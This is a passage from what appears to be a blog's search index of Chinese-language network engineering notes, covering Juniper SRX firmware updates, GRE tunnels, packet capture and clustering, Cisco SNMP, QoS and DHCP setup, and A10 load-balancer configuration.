(junos-srxsme-15.1X49-D120.3-domestic.tgz) cli 切換成 operational mode request system software add /var/tmp/usb/da2s1/junos-srxsme-15.1X49-D120.3-domestic.tgz request system reboot show version ","date":"June 12, 2018","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20180612-juniper-firmware-version-update/","summary":"\u003ch4 id=\"事前準備\"\u003e事前準備:\u003c/h4\u003e\n\u003cp\u003e插 console\u003c/p\u003e\n\u003cp\u003e將更新檔丟到 usb 裡\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003cem\u003e使用前可先使用 \u003ccode\u003eshow version\u003c/code\u003e 查看當前版本\u003c/em\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003ch4 id=\"更新-sop\"\u003e更新 SOP:\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003estart shell\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esu成root身分\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e建資料夾mkdir /var/tmp/usb(名字可自取)\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e插入 USB，這邊要注意 da 後面的數字，目前是 da1\u003c/li\u003e\n\u003cli\u003e掛載 \u003ccode\u003emount -t msdos /dev/da1s1 /var/tmp/usb\u003c/code\u003e (如果是 da0，就要變成 da0s1，以此類推)\u003c/li\u003e\n\u003cli\u003e跑完後 \u003ccode\u003ecd /cf/var/tmp/usb/da2s1/\u003c/code\u003e (usb)\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003els\u003c/code\u003e (junos-srxsme-15.1X49-D120.3-domestic.tgz)\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003ecli 切換成 operational mode\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003erequest system software add /var/tmp/usb/da2s1/junos-srxsme-15.1X49-D120.3-domestic.tgz\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003erequest system reboot\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eshow version\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e","tags":["Firewall","Juniper"],"title":"防火牆更新"},{"categories":["URL","Network","V2Ray","Proxy"],"contents":" 最好用的 V2Ray 一键安装脚本 \u0026amp; 管理脚本 v2ray ","date":"February 8, 2018","hero":"/images/hero/network.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20180208-v2ray/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://233blog.com/post/16/\" target=\"_blank\" rel=\"noopener\"\u003e最好用的 V2Ray 一键安装脚本 \u0026amp; 管理脚本\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/233boy/v2ray\" target=\"_blank\" rel=\"noopener\"\u003ev2ray\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Network","V2Ray","Proxy"],"title":"最好用的 V2Ray 一键安装脚本 \u0026 管理脚本"},{"categories":["URL","Switch","Cisco"],"contents":" 如何在 Switch 上啟用 snmp 設定 以 snmp-server 為主要指令\nC3750(Config)#snmp-server community RO\n指的是 SNMP 協定時互相溝通的密碼 RO 指的是 Read Only (SNMP 工具不允許修改設定) RW 指的是 Read and Write (SNMP 工具可以修改設定)\nC3750(config)#snmp-server group SNMP_ROA v3 priv match exact\n設定 SNMP Group 名： SNMP_ROA Version ： V3 最高的 priv C3750(config)#snmp-server user cater SNMP_ROA v3 auth MD5 cisco12345 priv des56 test12345\n這行設定跟 PRTG 設定有關聯，一定要記清楚\n使用者 ：cater 隸屬 Group 為：SNMP_ROA 驗證模式 ：MD5 密碼(MD5) ：cisco12345 (PRTG 要求要 8 碼以上) Priv 驗證密碼 ：test12345 (PRTG 要求要 8 碼以上) C3750(config)#snmp-server host 192.168.3.100 version 3 priv cater\n指定 SNMP SERVER：192.168.3.100 2. 使用 Version 3 使用 Priv 模式，使用者為 cater ","date":"February 4, 2018","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20180204-switchsnmp/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://itlocation.blogspot.com/2013/10/switchsnmp.html\" target=\"_blank\" rel=\"noopener\"\u003e如何在 Switch 上啟用 snmp 設定\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e以 snmp-server 為主要指令\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eC3750(Config)#snmp-server community RO\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e指的是 SNMP 協定時互相溝通的密碼\nRO 指的是 Read Only (SNMP 工具不允許修改設定)\nRW 指的是 Read and Write (SNMP 工具可以修改設定)\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eC3750(config)#snmp-server group SNMP_ROA v3 priv match exact\u003c/code\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e設定 SNMP Group 名： SNMP_ROA\u003c/li\u003e\n\u003cli\u003eVersion ： V3\u003c/li\u003e\n\u003cli\u003e最高的 priv\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003ccode\u003eC3750(config)#snmp-server user cater SNMP_ROA v3 auth MD5 cisco12345 priv des56 test12345\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e這行設定跟 PRTG 設定有關聯，一定要記清楚\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e使用者 ：cater\u003c/li\u003e\n\u003cli\u003e隸屬 Group 為：SNMP_ROA\u003c/li\u003e\n\u003cli\u003e驗證模式 ：MD5\u003c/li\u003e\n\u003cli\u003e密碼(MD5) ：cisco12345 (PRTG 要求要 8 碼以上)\u003c/li\u003e\n\u003cli\u003ePriv 驗證密碼 ：test12345 (PRTG 要求要 8 碼以上)\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003ccode\u003eC3750(config)#snmp-server host 192.168.3.100 version 3 priv cater\u003c/code\u003e\u003c/p\u003e","tags":["URL","Switch","Cisco"],"title":"如何在 Switch 上啟用 snmp 設定"},{"categories":["URL","Application Delivery Controller","A10"],"contents":" A10 Link Aggregation Health Monitor use TCL A10 SSL Offload Cipher Suite Support List Compression A10 RAM Cache 加速 A10 NAT A10 configuration template A10 Link Aggregation 802.3ad LACP A10 trunk can config a maximnm of 16 LACP trunks per device.\ninterface ethernet 1 lacp trunk 1 mode active lacp timeout long ! interface ethernet 2 lacp trunk 1 mode active lacp timeout long Static Link Aggregation None LACP.\nUp to 8 static trunks.\ntrunk 1 ethernet 1 to 2 Compression slb server jal.tw jal.tw port 80 tcp slb service-group jal.tw_group tcp member jal.tw:80 ! ! slb template http html_gzip compression enable compression level 6 compression keep-accept-encoding enable compression content-type text compression content-type image slb virtual-server vip-172.31.6.211 172.31.6.211 port 80 http service-group jal.tw_group template http html_gzip RAM Cache slb server jal.tw jal.tw port 80 tcp slb service-group jal.tw_group tcp member jal.tw:80 slb template cache ram_cache_static_content verify-host accept-reload-req max-content-size 819200 default-policy-nocache policy uri .ico cache policy uri .gif cache policy uri .jpg cache policy uri .js cache policy uri .png cache policy uri .css cache ! ! slb virtual-server vip-172.31.6.211 172.31.6.211 port 80 http service-group jal.tw_group template cache ram_cache_static_content A10 NAT A10 outgoing NAT 分成 L3-mode 及 L4 概念來處理的 NAT\nWildcard outgoing NAT Layer 4 概念的 outgoing NAT 將 Clinet 端的 interface 設定為監聽模式 allow-promiscuous-vip 建立將要帶出去之 NAT IP (不能為 interface IP) 將 Gateway 視為 SLB Server 建立 Real Server 分別建立該 Gateway 的 Server Group (TCP 及 UDP 分開)，並將 Gateway 的 Real Sevrer 加為 member 使用 wildcard VIP 將流量送到 Gateway，但是 no-dest-nat (不換 destination IP，只換 destination MAC 為 gateway MAC) Gateway IP: 10.2.2.254/24 Source IP: 10.1.1.0/24 NAT IP: 10.2.2.100 Source vlan: 10 interface ve 10 ip allow-promiscuous-vip ! ip nat pool SNAT_IP 10.2.2.100 10.2.2.100 netmask /24 ! slb server GW_IP 10.2.2.254 port 0 tcp no health-check port 0 udp no health-check ! slb service-group GW_TCP tcp member GW_IP:0 ! slb service-group GW_UDP udp member GW_IP:0 ! slb virtual-server _wildcard_vserver 0.0.0.0 port 0 tcp source-nat pool SNAT_IP service-group GW_TCP no-dest-nat port 0 udp source-nat pool SNAT_IP service-group GW_UDP no-dest-nat port 0 others source-nat pool SNAT_IP service-group GW_TCP no-dest-nat port 21 ftp source-nat pool SNAT_IP service-group GW_TCP no-dest-nat L3 mode NAT Gateway IP: 10.2.2.254/24 Source IP: 10.1.1.0/24 NAT IP: 10.2.2.100 Source vlan: 10 Gateway vlan: 20 interface ve 20 ip nat outside interface ve 10 ip nat inside ! access-list 101 permit ip 10.1.1.0 0.0.0.255 any ! ip nat pool SNAT_IP 10.2.2.100 10.2.2.100 netmask /24 ! ip nat inside source list 101 pool SNAT_IP A10 configuration template clock timezone Asia/Taipei nodst ! slb template tcp Default idle-timeout 300 reset-fwd reset-rev ! ! logging syslog warning logging host 10.0.0.1 port 514 ! snmp-server enable snmp-server location \u0026#34;TAIWAN\u0026#34; snmp-server contact \u0026#34;a10@a10networks.com\u0026#34; snmp-server community read DontUsePublic remote 10.0.0.0 /24 snmp-server community read DontUsePublic remote 192.168.0.0 /16 ! enable-management service telnet management ! ip dns primary 2001:4860:4860::8888 ip dns secondary 8.8.8.8 ! web-service timeout-policy idle 60 ! ! enable-core ! ! terminal idle-timeout 60 ! ntp server tock.stdtime.gov.tw ntp enable ! A10 Debug 模式 enable debug packet interface eth x debug monitor A10 AXDebug 模式 enable axdebug show axdebug filter capture brief ... no axdebug 設定要觀察 VS :BGP_NTT_AG_MKT/113.25.198.111, port : 80 , proto : tcp AX2500#axdebug AX2500(axdebug)#filter 1 AX2500(axdebug-filter:1)#ip 113.25.198.111 /32 AX2500(axdebug-filter:1)#port 80 80 AX2500(axdebug-filter:1)#proto tcp AX2500(axdebug-filter:1)#exit AX2500(axdebug)#show axdebug filter axdebug filter 1 ip 113.25.198.111 /32 proto tcp port 80 80 將其存成 a2 檔名，並開始抓包 AX2500(axdebug)#capture save a2 0 停止抓包 AX2500(axdebug)#no capture brief 清除相關參數 AX2500(axdebug)#no filter 1 AX2500(axdebug)#show axdebug filter 1 ","date":"January 10, 2018","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20180110-a10/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://jal.tw/a10:l2:link-aggregation\" target=\"_blank\" rel=\"noopener\"\u003eA10 Link Aggregation\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://jal.tw/a10:slb:healthmonitor:tcl\" target=\"_blank\" rel=\"noopener\"\u003eHealth Monitor use TCL\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://jal.tw/a10:slb:ssl-cipher\" target=\"_blank\" rel=\"noopener\"\u003eA10 SSL Offload Cipher Suite Support List\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://jal.tw/a10:slb:compression\" target=\"_blank\" rel=\"noopener\"\u003eCompression\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://jal.tw/a10:slb:ramcache\" target=\"_blank\" rel=\"noopener\"\u003eA10 RAM Cache 加速\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://jal.tw/a10:nat\" target=\"_blank\" rel=\"noopener\"\u003eA10 NAT\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://jal.tw/a10:basic:config\" target=\"_blank\" rel=\"noopener\"\u003eA10 configuration template\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"a10-link-aggregation\"\u003eA10 Link Aggregation\u003c/h4\u003e\n\u003ch5 id=\"8023ad-lacp\"\u003e802.3ad LACP\u003c/h5\u003e\n\u003cblockquote\u003e\n\u003cp\u003eA10 trunk can config a maximnm of 16 LACP trunks per device.\u003c/p\u003e\u003c/blockquote\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003einterface ethernet 1\n lacp trunk 1 mode active\n lacp timeout long\n!\ninterface ethernet 2\n lacp trunk 1 mode active\n lacp timeout long\n\u003c/code\u003e\u003c/pre\u003e\u003ch5 id=\"static-link-aggregation\"\u003eStatic Link Aggregation\u003c/h5\u003e\n\u003cblockquote\u003e\n\u003cp\u003eNone LACP.\u003c/p\u003e\n\u003cp\u003eUp to 8 static trunks.\u003c/p\u003e","tags":["URL","Application Delivery Controller","A10"],"title":"A10"},{"categories":["URL","Network","HTTP"],"contents":" 具有代表性的 HTTP 状态码 ","date":"December 15, 2017","hero":"/images/hero/network.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2017/20171215-6844903519447678990/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://juejin.cn/post/6844903519447678990\" target=\"_blank\" rel=\"noopener\"\u003e具有代表性的 HTTP 状态码\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Network","HTTP"],"title":"具有代表性的 HTTP 状态码"},{"categories":["Network","Switch","Cisco"],"contents":"Switch Switch 通常是 L2 設備\n只會將封包傳送到指定目的地的電腦（透過 MAC Table），相對上能減少資料碰撞及資料被竊聽的機會。交換器更能將同時傳到的封包分別處理，而集線器則不能。 Hub 則是 L1 設備\n會將網路內某一使用者傳送的封包傳至所有已連接到集線器的電腦，因會碰撞所以 random retry。 MAC Table\nLearning 從某個 Port 收到某網段（設為 A）MAC 位址為 X 的計算機發給 MAC 位址為 Y 的計算機的資料包。交換機從而記下了 MAC 位址 X 在網段 A。這稱為學習(learning)。 Flooding 交換機還不知道 MAC 位址 Y 在哪個網段上，於是向除了 A 以外的所有網段轉發該資料包。這稱為洪水(flooding)。 Forwarding MAC 位址 Y 的電腦收到該封包，向 MAC 位址 X 發出確認包。交換器收到該包後，從而記錄下 MAC 位址 Y 所在的網段。交換機向 MAC 位址 X 轉發確認包。這稱為轉發(forwarding)。 Filtering 交換機收到一個資料包，查表後發現該資料包的來源位址與目的位址屬於同一網段。交換機將不處理該資料包，這稱為過濾(filtering)。 Aging 交換機內部的 MAC 位址-網段查詢表的每條記錄採用時間戳記錄最後一次存取的時間。早於某個閾值（用戶可配置）的記錄被清除，這稱為老化(aging)。 Vlan Switch Interface 需支援 802.1Q\nChannel - 最多 8 隻腳對接，加大頻寬、備援。 Spanning Tree\nSpanning Tree Protocol (擴展樹協定) 技術可以令到網絡之間擁有備援功能，英文簡稱 STP。萬一真的出現網絡線中斷，它能夠在整過網絡自動偵測哪裡出現問題，然之後將備援線開啟，令到網絡繼續運行，使用者幾乎是沒有感受到網絡中斷。 除了得到備援功能之外，亦能避免迴轉 (Looping) 問題，這意思是網絡上 Switch 與 Switch 之間的網絡線形成迴圈。這裡有一個例子，萬一網管人員不小心插入一條能令網絡迴圈的網絡線，那麼 Spanning Tree 就會自動將網絡變成不迴圈情況。 Spanning Tree 是以路徑成本來計算 Switch 那一個埠是 Root Port、Designed Port、Block Port，這先要其中一台 Switch 成為 Root Bridge，要成為 Root Bridge 是以 Priority Number 加上 MAC 地址的最小值來決定，MAC 地址越小代表越早出廠。 一般來說如果重新計算哪一台 Switch 成為 Root Bridge 需要 60 秒，期間服務不 Work。 Vlan tag\n任一隻接腳 不支援 802.1Q 支援 802.1Q - 會在封包的 L2 加上 Tag Trunk - 可以多個 Tag 只收有 Tag 的封包 送的時候 Tag 保留 Access - 只能 1 個 Tag 只收沒有 Tag 的封包 送的時候 Tag 拿掉 [Cisco Switch] 自動備份設定檔 # 先設定排程指令與 tftp server IP config t kron policylist backup cli write cli show run | redirect tftp://192.168.0.50/DemoSW.cfg exit # 設定排程指令執行的時間 kron occurrence backup at 05:30 recurring policylist backup end # 存檔並顯示排程設定 write show kron schedule [Cisco Switch] 端口限速 低階端 Cisco Switch 只能針對 Inbound 流量限速\n流量限速設定方式如下 先在 Global 端啟用 Qos 功能\nmls qos\n5M 範本\n# 設定ACL指定來源IP ip access-list extended ACL_5M permit ip any any # 指定CLASS套用ACL範本，標記封包 class-map match-all CLASS_5M match access-group name ACL_5M # 指定policy套用CLASS，並指定限制速度 # (此處限速5M，並且允許Burst 100KB，多出來的封包會Drop掉) policy-map POLICY_5M class CLASS_5M police 5000000 100000 exceed-action drop # 對要限速的端口做限速5M interface GigabitEthernet0/2 service-policy input POLICY_5M 10M 範本\nip access-list extended ACL_10M permit ip any any class-map match-all CLASS_10M match access-group name ACL_10M policy-map POLICY_10M class CLASS_10M police 10000000 100000 exceed-action drop interface GigabitEthernet0/2 service-policy input POLICY_10M 15M 範本\nip access-list extended ACL_15M permit ip any any class-map match-all CLASS_15M match access-group name ACL_15M policy-map POLICY_15M class CLASS_15M police 15000000 100000 exceed-action drop # 指定介面 interface GigabitEthernet0/2 service-policy input POLICY_15M [Cisco Switch] DHCP DHCP 主機由 SW1 擔任，而 172.16.31.0 網段的主機需要透過 DHCP Relay 來取得 IP\nSW1#configure t Enter configuration commands, one per line. End with CNTL/Z. # 先設定interface的IP位址 SW1(config)#interface fa1/0 SW1(config-if)#no switchport SW1(config-if)#ip address 192.168.1.1 255.255.255.252 SW1(config-if)#no shutdown SW1(config-if)#exit SW1(config)#interface fa1/1 SW1(config-if)#no switchport SW1(config-if)#ip address 10.10.10.254 255.255.255.0 SW1(config-if)#no shutdown SW1(config-if)#exit SW1(config)#exit # 設定RIP路由 SW1(config)#router rip SW1(config-router)#version 2 SW1(config-router)#network 192.168.1.0 SW1(config-router)#network 10.10.10.0 SW1(config-router)#exit SW1(config)#exit # 設定10.10.10.0網段的DHCP pool SW1(config)#ip dhcp excluded-address 10.10.10.101 10.10.10.200 SW1(config)#ip dhcp pool 10-net SW1(dhcp-config)#network 10.10.10.0 255.255.255.0 SW1(dhcp-config)#default-router 10.10.10.254 SW1(dhcp-config)#lease infinite SW1(dhcp-config)#dns-server 168.95.1.1 SW1(dhcp-config)#end # 設定172.16.31.0網段的DHCP pool SW1#configure t Enter configuration commands, one per line. End with CNTL/Z. SW1(config)#ip dhcp excluded-address 172.16.31.101 172.16.31.200 SW1(config)#ip dhcp pool 172-net SW1(dhcp-config)#network 172.16.31.0 255.255.255.0 SW1(dhcp-config)#default-router 172.16.31.254 SW1(dhcp-config)#dns-server 168.95.1.1 SW1(dhcp-config)#lease infinite SW1(dhcp-config)#end SW1#wr # 先設定Interface的IP位址 SW2(config)#interface fa1/0 SW2(config-if)#no switchport SW2(config-if)#ip address 192.168.1.2 255.255.255.252 SW2(config-if)#no shutdown SW2(config-if)#exit SW2(config)#interface fa1/1 SW2(config-if)#no switchport SW2(config-if)#ip address 172.16.31.254 255.255.255.0 SW2(config-if)#ip helper-address 192.168.1.1 (設定DHCP Relay) SW2(config-if)#no shutdown SW2(config-if)#exit # 設定RIP路由 SW2(config)#router rip SW2(config-router)#version 2 SW2(config-router)#network 192.168.1.0 SW2(config-router)#network 172.16.31.0 SW2(config-router)#exit SW2(config)#exit SW2#wr # 檢查DHCP取得IP的狀況 SW1#show ip dhcp binding ","date":"November 25, 2017","hero":"/images/hero/network.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2017/20171125-cisco/","summary":"\u003ch4 id=\"switch\"\u003eSwitch\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003e\u003cem\u003eSwitch 通常是 L2 設備\u003c/em\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e只會將封包傳送到指定目的地的電腦（透過 MAC Table），相對上能減少資料碰撞及資料被竊聽的機會。交換器更能將同時傳到的封包分別處理，而集線器則不能。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e\u003cem\u003eHub 則是 L1 設備\u003c/em\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e會將網路內某一使用者傳送的封包傳至所有已連接到集線器的電腦，因會碰撞所以 random retry。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e\u003cem\u003eMAC Table\u003c/em\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eLearning\n\u003cul\u003e\n\u003cli\u003e從某個 Port 收到某網段（設為 A）MAC 位址為 X 的計算機發給 MAC 位址為 Y 的計算機的資料包。交換機從而記下了 MAC 位址 X 在網段 A。這稱為學習(learning)。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eFlooding\n\u003cul\u003e\n\u003cli\u003e交換機還不知道 MAC 位址 Y 在哪個網段上，於是向除了 A 以外的所有網段轉發該資料包。這稱為洪水(flooding)。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eForwarding\n\u003cul\u003e\n\u003cli\u003eMAC 位址 Y 的電腦收到該封包，向 MAC 位址 X 發出確認包。交換器收到該包後，從而記錄下 MAC 位址 Y 所在的網段。交換機向 MAC 位址 X 轉發確認包。這稱為轉發(forwarding)。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eFiltering\n\u003cul\u003e\n\u003cli\u003e交換機收到一個資料包，查表後發現該資料包的來源位址與目的位址屬於同一網段。交換機將不處理該資料包，這稱為過濾(filtering)。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eAging\n\u003cul\u003e\n\u003cli\u003e交換機內部的 MAC 位址-網段查詢表的每條記錄採用時間戳記錄最後一次存取的時間。早於某個閾值（用戶可配置）的記錄被清除，這稱為老化(aging)。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch5 id=\"vlan\"\u003eVlan\u003c/h5\u003e\n\u003cp\u003eSwitch Interface 需支援 802.1Q\u003c/p\u003e","tags":["Network","Switch","Cisco"],"title":"Switch notes"},{"categories":["Network","Firewall","Juniper"],"contents":"[Juniper Firewall] tunnel ACG icare@TWCHIJF01# show | compare rollback 4\n[edit security policies] from-zone DB_12 to-zone TCT_Office { ... } + from-zone DB_12 to-zone JC32 { + policy For_Backup { + match { + source-address DB_10.11.12.0/24; + destination-address BACKUP_10.32.32.130; + application any; + } + then { + permit; + } + } + } [edit security zones security-zone DB_12 address-book] address DB_10.11.12.57 { ... } + address DB_10.11.12.0/24 10.11.12.0/24; [edit security zones] security-zone ESB_15 { ... } + security-zone JC32 { + address-book { + address BACKUP_10.32.32.130 10.32.32.130/32; + } + host-inbound-traffic { + system-services { + ping; + } + } + interfaces { + gr-0/0/0.32; + } + } [edit interfaces gr-0/0/0] + unit 32 { + description To_JC32_DBBackup; + tunnel { + source 202.168.193.128; + destination 218.253.210.8; + } + family inet { + address 10.32.0.101/30; + } + } [edit routing-options static] route 0.0.0.0/0 { ... } + route 10.32.32.130/32 next-hop 10.32.0.102; set security policies from-zone DB_12 to-zone JC32 policy For_Backup match source-address DB_10.11.12.0/24 set security policies from-zone DB_12 to-zone JC32 policy For_Backup match destination-address BACKUP_10.32.32.130 set security policies from-zone DB_12 to-zone JC32 policy For_Backup match application any set security policies from-zone DB_12 to-zone JC32 policy For_Backup then permit set security zones security-zone DB_12 address-book address DB_10.11.12.0/24 10.11.12.0/24 set security zones security-zone JC32 address-book address BACKUP_10.32.32.130 10.32.32.130/32 set security zones security-zone JC32 host-inbound-traffic system-services ping set security zones security-zone JC32 interfaces gr-0/0/0.32 set interfaces gr-0/0/0 unit 32 description To_JC32_DBBackup set interfaces gr-0/0/0 unit 32 tunnel source 202.168.193.128 set interfaces gr-0/0/0 unit 32 tunnel destination 218.253.210.8 set interfaces gr-0/0/0 unit 32 family inet address 10.32.0.101/30 set routing-options static route 10.32.32.130/32 next-hop 10.32.0.102 icare@TWCHIJF01\u0026gt; show configuration | compare rollback 1\n[edit routing-options static] route 10.32.32.0/24 { ... } + route 218.253.210.8/32 next-hop 202.168.193.145; set routing-options static route 218.253.210.8/32 next-hop 202.168.193.145 JC27_32\nsupport021@JC27_32-node0# show | compare rollback 5\n[edit security policies] + from-zone TWACG to-zone GPO { + policy For_DBBACKUP { + match { + source-address DB_10.11.12.0/24; + destination-address Backup_10.32.32.130; + application any; + } + then { + permit; + } + } + } [edit security zones security-zone GPO address-book] address Other_API_10.32.32.115 { ... } + address Backup_10.32.32.130 10.32.32.130/32; [edit security zones security-zone JC27_33 address-book] address 33_OG_Lottery_10.33.11.0/24 { ... } + address Zabbix_Agent_10.33.100.2 10.33.100.2/32; [edit security zones security-zone JC27_33 host-inbound-traffic system-services] ping { ... } + ssh; [edit security zones] security-zone PROXY { ... } + security-zone TWACG { + address-book { + address DB_10.11.12.0/24 10.11.12.0/24; + } + host-inbound-traffic { + system-services { + ping; + } + } + interfaces { + gr-0/0/0.11; + } + } [edit interfaces gr-0/0/0] + unit 11 { + description To_TWACG; + tunnel { + source 218.253.210.8; + destination 202.168.193.128; + } + family inet { + address 10.32.0.102/30; + } + } [edit routing-options static] route 172.16.3.0/24 { ... } + route 10.11.12.0/24 next-hop 10.32.0.101; set security policies from-zone TWACG to-zone GPO policy For_DBBACKUP match source-address DB_10.11.12.0/24 set security policies from-zone TWACG to-zone GPO policy For_DBBACKUP match destination-address Backup_10.32.32.130 set security policies from-zone TWACG to-zone GPO policy For_DBBACKUP match application any set security policies from-zone TWACG to-zone GPO policy For_DBBACKUP then permit set security zones security-zone GPO address-book address Backup_10.32.32.130 10.32.32.130/32 set security zones security-zone TWACG address-book address DB_10.11.12.0/24 10.11.12.0/24 set security zones security-zone TWACG host-inbound-traffic system-services ping set security zones security-zone TWACG interfaces gr-0/0/0.11 set interfaces gr-0/0/0 unit 11 description To_TWACG set interfaces gr-0/0/0 unit 11 tunnel source 218.253.210.8 set interfaces gr-0/0/0 unit 11 tunnel destination 202.168.193.128 set interfaces gr-0/0/0 unit 11 family inet address 10.32.0.102/30 set routing-options static route 10.11.12.0/24 next-hop 10.32.0.101 set security policies from-zone MNL to-zone GPO policy For_ACG_DB_Backup match source-address TCT_DBA_10.22.12.103 set security policies from-zone MNL to-zone GPO policy For_ACG_DB_Backup match destination-address Backup_10.32.32.130 set security policies from-zone MNL to-zone GPO policy For_ACG_DB_Backup match application junos-ping set security policies from-zone MNL to-zone GPO policy For_ACG_DB_Backup match application TCP_11129 set security policies from-zone MNL to-zone GPO policy For_ACG_DB_Backup match application junos-ssh set security policies from-zone MNL to-zone GPO policy For_ACG_DB_Backup then permit set security zones security-zone MNL address-book address TCT_DBA_10.22.12.103 10.22.12.103/32 [Juniper] packet capture Configure forwarding options\n[edit] user@host# edit forwarding-options packet-capture [edit forwarding-options packet-capture] user@host# Specify a file name for the packet capture and set the maximum-capture-size to 1500 as below: [edit forwarding-options packet-capture] user@host# set file filename testpacketcapture [edit forwarding-options packet-capture] user@host# set maximum-capture-size 1500 [edit forwarding-options packet-capture] user@host# show file filename testpacketcapture; maximum-capture-size 1500; [edit forwarding-options packet-capture] user@host#top Configure firewall filter for packet capture.\nuser@host# set firewall filter PCAP term 1 from source-address 10.209.144.32 user@host# set firewall filter PCAP term 1 from destination-address 10.204.115.166 user@host# set firewall filter PCAP term 1 then sample user@host# set firewall filter PCAP term 1 then accept user@host# set firewall filter PCAP term 2 from source-address 10.204.115.166 user@host# set firewall filter PCAP term 2 from destination-address 10.209.144.32 user@host# set firewall filter PCAP term 2 then sample user@host# set firewall filter PCAP term 2 then accept user@host# set firewall filter PCAP term allow-all-else then accept Apply firewall fIlter to desired interface\nuser@host# set interfaces ge-0/0/0 unit 0 family inet filter output PCAP user@host# set interfaces ge-0/0/0 unit 0 family inet filter input PCAP user@host# commit Copy packet capture file from the SRX or J-Series device, and view it with your PCAP utility.\nuser@host\u0026gt; file list /var/tmp/ | match testpacketcapture* testpacketcapture1.ge-0.0 log session set security policies from-zone IT to-zone INTERNET policy For_Tset then log session-init set security policies from-zone IT to-zone INTERNET policy For_Test then log session-close show log traffic-log 設定相關 Filter 做 Debug Mode 使用 root@junos-SRX\u0026gt; show configuration security flow | display set set security flow traceoptions file tracetest set security flow traceoptions flag basic-datapath set security flow traceoptions packet-filter ICMP-Filter protocol icmp set security flow traceoptions packet-filter ICMP-Filter source-prefix 192.168.88.0/24 set security flow traceoptions packet-filter ICMP-Filter destination-prefix 168.95.1.1/32 root@junos-SRX\u0026gt; show configuration security flow traceoptions { file tracetest; flag basic-datapath; packet-filter ICMP-Filter { protocol icmp; source-prefix 192.168.88.0/24; destination-prefix 168.95.1.1/32; } } 檢查 Log 檔\nroot@junos-SRX\u0026gt; show log tracetest [Juniper] SRX Cluster HA 設定 測試環境：SRX 220H 兩台 SRX 220H Cluster 默認端口 (fxp0)管理端口：Ge-0/0/6 (Control Plane：fxp1)控制端口：Ge-0/0/7 (Fabric Link 也叫 Data Plane：fab)數據同步端口：Ge-0/0/1 使用集群則集群後接口標示為：Ge-0/0/0-7; Ge-3/0/0-7 不同型號集群後端口顯示不同，參考官方手冊 配置設定\nOn device A:\u0026gt;set chassis cluster cluster-id 1 node 0 reboot On device B:\u0026gt;set chassis cluster cluster-id 1 node 1 reboot On device A: set groups node0 system host-name SRX-Primary set groups node0 interfaces fxp0 unit 0 family inet address 10.10.30.189/24 set groups node1 system host-name SRX-Secondby set groups node1 interfaces fxp0 unit 0 family inet address 10.10.30.190/24 set apply-groups \u0026#34;${node}\u0026#34; set interfaces fab0 fabric-options member-interfaces ge-0/0/1 set interfaces fab1 fabric-options member-interfaces ge-3/0/1 set chassis cluster redundancy-group 0 node 0 priority 100 set chassis cluster redundancy-group 0 node 1 